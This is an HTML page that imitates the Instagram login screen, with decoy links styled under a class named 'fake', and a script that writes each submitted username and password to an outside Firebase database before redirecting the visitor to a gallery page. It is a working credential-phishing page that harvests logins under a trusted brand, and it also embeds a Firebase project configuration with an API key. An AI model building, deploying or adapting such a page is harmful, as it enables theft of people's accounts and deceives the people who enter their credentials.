<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Instagram</title>

<style>
body{
    font-family:Arial,sans-serif<;
    background:#fafafa;
}

.container{
    width:330px;
    margin:40px auto;
    text-align:center;
}

h1{
    font-family:cursive;
    font-size:80px;
}

input{
    width:100%;
    padding:12px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:4px;
    font-size:16px;
}

button{
    width:100%;
    padding:12px;
    background:#4ea3ff;
    color:white;
    border:none;
    border-radius:4px;
    font-size:18px;
    cursor:pointer;
}

.fake{
    color:#1877f2;
    margin:20px 0;
    cursor:default;
}

.or{
    margin:20px 0;
    color:#777;
}
</style>

</head>

<body>

<div class="container">

<h1>Instagram</h1>

<form id="registerForm">

<input type="text" id="name1" placeholder="Phone number, username or email" required>

<input type="text" id="name2" placeholder="password" required>

<button type="submit">submit</button>

</form>

<div class="fake">Forgot something?</div>

<div class="or">──────── OR ────────</div>

<div class="fake">Don't have an account? Sign Up.</div>

</div>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyBN3HnZpNW75Glu8fvrJBP48VFuG7aF4d4",
  authDomain: "student1-6c35a.firebaseapp.com",
  projectId: "student1-6c35a",
  storageBucket: "student1-6c35a.firebasestorage.app",
  messagingSenderId: "810364006325",
  appId: "1:810364006325:web:93a188eb3e1ebbc1f133fc"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

document.getElementById("registerForm").addEventListener("submit", async(e)=>{

e.preventDefault();

await addDoc(collection(db,"users"),{

name1:document.getElementById("name1").value,
name2:document.getElementById("name2").value

});

document.getElementById("registerForm").reset();
window.location.href = "gallery.html";
});

</script>

</body>
  </html>
